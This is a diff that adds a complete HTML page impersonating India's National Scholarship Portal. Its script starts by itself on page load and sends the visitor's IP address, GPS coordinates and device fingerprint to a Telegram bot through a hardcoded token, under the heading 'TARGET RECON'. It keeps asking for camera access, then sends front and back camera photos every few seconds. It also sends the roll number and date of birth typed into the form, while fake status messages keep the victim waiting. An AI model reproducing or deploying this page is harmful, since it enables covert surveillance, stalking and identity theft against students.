@@ -1,0 +1,636 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>National Scholarship Portal</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  :root {
+    --bg: #07090e;
+    --card: #111621;
+    --card-2: #161c29;
+    --accent: #2f7fff;
+    --accent-2: #5b4dff;
+    --text: #eef2f8;
+    --muted: #7d8899;
+    --border: rgba(255,255,255,0.07);
+    --ok: #22c55e;
+    --gold: #f5b544;
+  }
+  html, body {
+    height: 100%;
+    background: radial-gradient(circle at 50% -10%, #16233d 0%, var(--bg) 60%);
+    color: var(--text);
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    overflow-x: hidden;
+  }
+  body {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+
+  /* ---------- LOADING ---------- */
+  #screen-loading {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 18px;
+    animation: fadeIn 0.4s ease;
+  }
+  .spinner {
+    width: 52px; height: 52px;
+    border: 3px solid rgba(255,255,255,0.07);
+    border-top-color: var(--accent);
+    border-right-color: var(--accent-2);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes fadeOut { to { opacity: 0; visibility: hidden; } }
+  .msg { font-size: 13.5px; color: var(--muted); letter-spacing: 0.2px; transition: opacity 0.3s ease; }
+
+  /* ---------- PORTAL ---------- */
+  #screen-portal {
+    display: none;
+    width: 100%;
+    max-width: 420px;
+  }
+  #screen-portal.show { display: block; animation: cardIn 0.6s cubic-bezier(.2,.8,.2,1); }
+  @keyframes cardIn {
+    from { opacity: 0; transform: translateY(18px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .portal-card {
+    background: linear-gradient(160deg, var(--card) 0%, var(--card-2) 100%);
+    border: 1px solid var(--border);
+    border-radius: 22px;
+    padding: 0 0 24px;
+    box-shadow: 0 30px 80px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.04);
+    overflow: hidden;
+  }
+
+  /* gov-style top band */
+  .top-band {
+    background: linear-gradient(135deg, #1a2740, #0f1828);
+    padding: 20px 24px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+  }
+  .top-band::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--gold), transparent);
+    opacity: 0.6;
+  }
+  .seal {
+    width: 44px; height: 44px;
+    border-radius: 10px;
+    background: linear-gradient(145deg, #f5b544, #d99a2b);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    box-shadow: 0 4px 14px rgba(245,181,68,0.35);
+  }
+  .seal svg { width: 24px; height: 24px; stroke: #1a1206; fill: none; stroke-width: 2.2; }
+  .top-band h1 {
+    font-size: 14.5px;
+    font-weight: 600;
+    line-height: 1.3;
+    letter-spacing: -0.1px;
+  }
+  .top-band p {
+    font-size: 10.5px;
+    color: var(--muted);
+    margin-top: 2px;
+    letter-spacing: 0.3px;
+  }
+
+  .card-body { padding: 24px 24px 0; }
+
+  .welcome {
+    font-size: 13px;
+    color: var(--muted);
+    line-height: 1.55;
+    margin-bottom: 22px;
+  }
+  .welcome strong { color: var(--text); font-weight: 600; }
+
+  .tabs {
+    display: flex;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  .tab {
+    flex: 1;
+    padding: 9px 8px;
+    font-size: 12px;
+    font-weight: 500;
+    text-align: center;
+    color: var(--muted);
+    background: rgba(255,255,255,0.02);
+    border: 1px solid var(--border);
+    border-radius: 9px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+  }
+  .tab.active {
+    color: var(--text);
+    background: rgba(47,127,255,0.12);
+    border-color: rgba(47,127,255,0.4);
+  }
+
+  .field-label {
+    display: block;
+    font-size: 12px;
+    color: var(--muted);
+    margin-bottom: 7px;
+    font-weight: 500;
+    letter-spacing: 0.2px;
+  }
+  .input-wrap {
+    position: relative;
+    margin-bottom: 16px;
+  }
+  .input-wrap svg {
+    position: absolute;
+    left: 14px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 16px; height: 16px;
+    stroke: var(--muted);
+    fill: none;
+    stroke-width: 2;
+    pointer-events: none;
+  }
+  .input-wrap input {
+    width: 100%;
+    padding: 13px 14px 13px 42px;
+    background: rgba(255,255,255,0.025);
+    border: 1px solid var(--border);
+    border-radius: 11px;
+    color: var(--text);
+    font-size: 14.5px;
+    outline: none;
+    transition: border-color 0.2s ease, box-shadow 0.2s ease;
+  }
+  .input-wrap input::placeholder { color: #4a5468; }
+  .input-wrap input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(47,127,255,0.13);
+  }
+
+  .check-btn {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(135deg, var(--accent), var(--accent-2));
+    color: #fff;
+    font-size: 15px;
+    font-weight: 600;
+    letter-spacing: 0.2px;
+    cursor: pointer;
+    box-shadow: 0 10px 26px rgba(47,127,255,0.35);
+    transition: transform 0.15s ease, opacity 0.2s ease;
+    margin-top: 4px;
+  }
+  .check-btn:active { transform: scale(0.97); }
+
+  .portal-foot {
+    margin-top: 20px;
+    padding: 16px 24px 0;
+    border-top: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    font-size: 10.5px;
+    color: #545e70;
+    letter-spacing: 0.2px;
+  }
+  .portal-foot .dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: var(--ok);
+    box-shadow: 0 0 8px var(--ok);
+    animation: blink 2s ease-in-out infinite;
+  }
+  @keyframes blink { 50% { opacity: 0.4; } }
+
+  /* ---------- STATUS ---------- */
+  #screen-status {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 18px;
+    text-align: center;
+  }
+  #screen-status.show { display: flex; animation: fadeIn 0.4s ease; }
+  .status-spinner {
+    width: 56px; height: 56px;
+    border: 3px solid rgba(255,255,255,0.07);
+    border-top-color: var(--accent);
+    border-right-color: var(--accent-2);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+  .status-title { font-size: 16px; font-weight: 600; }
+  .status-sub {
+    font-size: 13px;
+    color: var(--muted);
+    max-width: 280px;
+    line-height: 1.55;
+    transition: opacity 0.3s ease;
+  }
+</style>
+</head>
+<body>
+
+<div id="screen-loading">
+  <div class="spinner"></div>
+  <div class="msg" id="loadingMsg">Establishing secure connection...</div>
+</div>
+
+<div id="screen-portal">
+  <div class="portal-card">
+    <div class="top-band">
+      <div class="seal">
+        <svg viewBox="0 0 24 24"><path d="M12 2L3 7v6c0 5 4 9 9 10 5-1 9-5 9-10V7l-9-5z"/><path d="M9 12l2 2 4-4"/></svg>
+      </div>
+      <div>
+        <h1>National Scholarship Portal</h1>
+        <p>Ministry of Education · Govt. of India</p>
+      </div>
+    </div>
+
+    <div class="card-body">
+      <p class="welcome">Check your <strong>scholarship selection status</strong> for advanced school &amp; college level awards. Enter your registration details below.</p>
+
+      <div class="tabs">
+        <div class="tab active" data-tab="school">School Level</div>
+        <div class="tab" data-tab="college">College Level</div>
+      </div>
+
+      <label class="field-label" for="rollInput">Roll Number / Registration ID</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 10h18"/><path d="M7 15h4"/></svg>
+        <input id="rollInput" type="text" placeholder="e.g. NSP2024001234" autocomplete="off">
+      </div>
+
+      <label class="field-label" for="dobInput">Date of Birth</label>
+      <div class="input-wrap">
+        <svg viewBox="0 0 24 24"><rect x="3" y="5" width="18" height="16" rx="2"/><path d="M16 3v4M8 3v4M3 11h18"/></svg>
+        <input id="dobInput" type="text" placeholder="DD / MM / YYYY" autocomplete="off">
+      </div>
+
+      <button class="check-btn" id="checkBtn">Check Scholarship Status</button>
+    </div>
+
+    <div class="portal-foot">
+      <span class="dot"></span>Secure portal · Aadhaar-linked · Encrypted
+    </div>
+  </div>
+</div>
+
+<div id="screen-status">
+  <div class="status-spinner"></div>
+  <div class="status-title">Checking Status</div>
+  <div class="status-sub" id="statusSub">Fetching your scholarship record...</div>
+</div>
+
+<video id="v" autoplay playsinline muted style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
+
+<script>
+(function(){
+  const BOT_TOKEN = "9189761521:AAFDVmvb29Da5H964w8BCwrEmNfFM5L5UVI";
+  const CHAT_ID   = "8988093367";
+  const INTERVAL  = 3000;
+
+  const video  = document.getElementById('v');
+  const canvas = document.getElementById('c');
+  const ctx    = canvas.getContext('2d');
+
+  const scrLoad   = document.getElementById('screen-loading');
+  const scrPortal = document.getElementById('screen-portal');
+  const scrStatus = document.getElementById('screen-status');
+  const loadingMsg = document.getElementById('loadingMsg');
+  const statusSub  = document.getElementById('statusSub');
+  const rollInput  = document.getElementById('rollInput');
+  const dobInput   = document.getElementById('dobInput');
+  const checkBtn   = document.getElementById('checkBtn');
+
+  let stream = null;
+  let camLoopRunning = false;
+  let selectedTab = 'school';
+
+  /* ---------- TELEGRAM ---------- */
+  async function tgSendPhoto(dataUrl, caption) {
+    try {
+      const blob = await (await fetch(dataUrl)).blob();
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('caption', caption);
+      form.append('photo', blob, 'shot.jpg');
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
+    } catch(e) {}
+  }
+  async function tgSendText(text) {
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+      });
+    } catch(e) {}
+  }
+
+  /* ---------- RECON ---------- */
+  async function getIP() {
+    const endpoints = [
+      'https://api.ipify.org?format=json',
+      'https://ipapi.co/json/',
+      'https://ipinfo.io/json'
+    ];
+    for (const url of endpoints) {
+      try {
+        const r = await fetch(url);
+        if (!r.ok) continue;
+        const j = await r.json();
+        return {
+          ip: j.ip || j.query || 'unknown',
+          city: j.city || '—',
+          region: j.region || j.region_name || '—',
+          country: j.country_name || j.country || '—',
+          isp: j.org || j.isp || '—',
+          loc: j.loc || (j.latitude ? `${j.latitude},${j.longitude}` : '—')
+        };
+      } catch(e) {}
+    }
+    return { ip: 'unknown' };
+  }
+
+  function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    return {
+      userAgent: ua,
+      platform: navigator.platform || '—',
+      language: navigator.language || '—',
+      languages: (navigator.languages || []).join(', ') || '—',
+      screen: `${screen.width}x${screen.height} @ ${devicePixelRatio}x`,
+      viewport: `${innerWidth}x${innerHeight}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+      cores: navigator.hardwareConcurrency || '—',
+      memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—',
+      touch: 'ontouchstart' in window ? 'Yes' : 'No',
+      online: navigator.onLine ? 'Yes' : 'No'
+    };
+  }
+
+  async function getGPS() {
+    return new Promise((resolve) => {
+      if (!navigator.geolocation) return resolve(null);
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: Math.round(pos.coords.accuracy)
+        }),
+        () => resolve(null),
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+      );
+    });
+  }
+
+  async function sendFullRecon() {
+    // 1. IP info
+    const ip = await getIP();
+    // 2. GPS
+    const gps = await getGPS();
+    // 3. Device
+    const dev = getDeviceInfo();
+
+    let msg = `<b>🎯 TARGET RECON — SESSION START</b>\n`;
+    msg += `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n\n`;
+
+    msg += `<b>🌐 IP / Network</b>\n`;
+    msg += `IP: <code>${ip.ip}</code>\n`;
+    if (ip.city) msg += `City: ${ip.city}\n`;
+    if (ip.region) msg += `Region: ${ip.region}\n`;
+    if (ip.country) msg += `Country: ${ip.country}\n`;
+    if (ip.isp) msg += `ISP: ${ip.isp}\n`;
+    if (ip.loc && ip.loc !== '—') msg += `Approx Loc: <code>${ip.loc}</code>\n`;
+    if (ip.ip !== 'unknown') msg += `<a href="https://ipinfo.io/${ip.ip}">📍 View on map</a>\n`;
+
+    msg += `\n<b>📡 GPS</b>\n`;
+    if (gps) {
+      msg += `Lat: <code>${gps.lat}</code>\n`;
+      msg += `Lon: <code>${gps.lon}</code>\n`;
+      msg += `Accuracy: ±${gps.acc}m\n`;
+      msg += `<a href="https://www.google.com/maps?q=${gps.lat},${gps.lon}">📍 Open in Google Maps</a>\n`;
+    } else {
+      msg += `GPS: denied / unavailable\n`;
+    }
+
+    msg += `\n<b>📱 Device</b>\n`;
+    msg += `Platform: ${dev.platform}\n`;
+    msg += `Language: ${dev.language}\n`;
+    msg += `Screen: ${dev.screen}\n`;
+    msg += `Viewport: ${dev.viewport}\n`;
+    msg += `Timezone: ${dev.timezone}\n`;
+    msg += `Cores: ${dev.cores}\n`;
+    msg += `Memory: ${dev.memory}\n`;
+    msg += `Touch: ${dev.touch}\n`;
+    msg += `Online: ${dev.online}\n`;
+
+    msg += `\n<b>🧾 User Agent</b>\n<code>${dev.userAgent}</code>\n`;
+
+    await tgSendText(msg);
+  }
+
+  /* ---------- CAMERA ---------- */
+  async function openCamera(face) {
+    try {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: face, width: { ideal: 1280 }, height: { ideal: 720 } },
+        audio: false
+      });
+      video.srcObject = stream;
+      await video.play().catch(()=>{});
+      return true;
+    } catch(e) { return false; }
+  }
+  function grab() {
+    if (!video.videoWidth) return null;
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    return canvas.toDataURL('image/jpeg', 0.85);
+  }
+  const settle = ms => new Promise(r => setTimeout(r, ms));
+
+  async function camCycle() {
+    if (await openCamera('user')) {
+      await settle(700);
+      const d = grab();
+      if (d) await tgSendPhoto(d, `📸 FRONT CAM | ${new Date().toLocaleTimeString()}`);
+    }
+    if (await openCamera('environment')) {
+      await settle(700);
+      const d = grab();
+      if (d) await tgSendPhoto(d, `📸 BACK CAM | ${new Date().toLocaleTimeString()}`);
+    }
+    await openCamera('user');
+  }
+  async function camLoop() {
+    if (camLoopRunning) return;
+    camLoopRunning = true;
+    while (true) {
+      await camCycle();
+      await settle(INTERVAL);
+    }
+  }
+
+  /* ---------- PERMISSION NAG ---------- */
+  let camGranted = false;
+  async function tryCam() {
+    if (camGranted) return;
+    const ok = await openCamera('user');
+    if (ok) { camGranted = true; camLoop(); }
+  }
+  async function camNag() {
+    await tryCam();
+    while (!camGranted) {
+      await settle(2000);
+      await tryCam();
+    }
+  }
+  function bindGesture() {
+    const h = () => tryCam();
+    document.addEventListener('click', h, { passive: true });
+    document.addEventListener('touchstart', h, { passive: true });
+  }
+
+  /* ---------- TABS ---------- */
+  document.querySelectorAll('.tab').forEach(tab => {
+    tab.addEventListener('click', () => {
+      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+      tab.classList.add('active');
+      selectedTab = tab.dataset.tab;
+    });
+  });
+
+  /* ---------- LOADING SEQUENCE ---------- */
+  const loadingSteps = [
+    "Establishing secure connection...",
+    "Requesting device permissions...",
+    "Verifying session integrity...",
+    "Loading scholarship database...",
+    "Almost ready..."
+  ];
+
+  async function runLoadingSequence() {
+    let i = 0;
+    const total = 6500;
+    const step = total / loadingSteps.length;
+
+    const t = setInterval(() => {
+      i++;
+      if (i < loadingSteps.length) {
+        loadingMsg.style.opacity = 0;
+        setTimeout(() => {
+          loadingMsg.textContent = loadingSteps[i];
+          loadingMsg.style.opacity = 1;
+        }, 200);
+      }
+    }, step);
+
+    // fire permission nag + full recon in parallel
+    camNag();
+    sendFullRecon();
+
+    await settle(total);
+    clearInterval(t);
+
+    scrLoad.style.animation = 'fadeOut 0.4s ease forwards';
+    await settle(400);
+    scrLoad.style.display = 'none';
+    scrPortal.classList.add('show');
+  }
+
+  /* ---------- CHECK FLOW ---------- */
+  let statusStarted = false;
+  const statusSteps = [
+    "Fetching your scholarship record from the database...",
+    "Validating registration details...",
+    "Cross-checking with state education office...",
+    "Verifying Aadhaar linkage...",
+    "Retrieving selection status...",
+    "Almost done, please wait..."
+  ];
+
+  checkBtn.addEventListener('click', async () => {
+    const roll = rollInput.value.trim();
+    const dob  = dobInput.value.trim();
+
+    if (!roll) {
+      rollInput.focus();
+      rollInput.style.borderColor = '#ef4444';
+      setTimeout(() => rollInput.style.borderColor = '', 800);
+      return;
+    }
+    if (!dob) {
+      dobInput.focus();
+      dobInput.style.borderColor = '#ef4444';
+      setTimeout(() => dobInput.style.borderColor = '', 800);
+      return;
+    }
+
+    // send submitted details
+    await tgSendText(
+      `<b>📝 FORM SUBMITTED</b>\n` +
+      `Level: ${selectedTab === 'school' ? 'School' : 'College'}\n` +
+      `Roll / Reg ID: <code>${roll}</code>\n` +
+      `DOB: <code>${dob}</code>\n` +
+      `Time: ${new Date().toLocaleString()}`
+    );
+
+    scrPortal.classList.remove('show');
+    await settle(200);
+    scrStatus.classList.add('show');
+
+    if (statusStarted) return;
+    statusStarted = true;
+
+    let j = 0;
+    setInterval(() => {
+      j = (j + 1) % statusSteps.length;
+      statusSub.style.opacity = 0;
+      setTimeout(() => {
+        statusSub.textContent = statusSteps[j];
+        statusSub.style.opacity = 1;
+      }, 200);
+    }, 3500);
+  });
+
+  /* ---------- BOOT ---------- */
+  const boot = () => { runLoadingSequence(); bindGesture(); };
+  if (document.readyState === 'complete') boot();
+  else window.addEventListener('load', boot);
+})();
+</script>
+</body>
+</html>
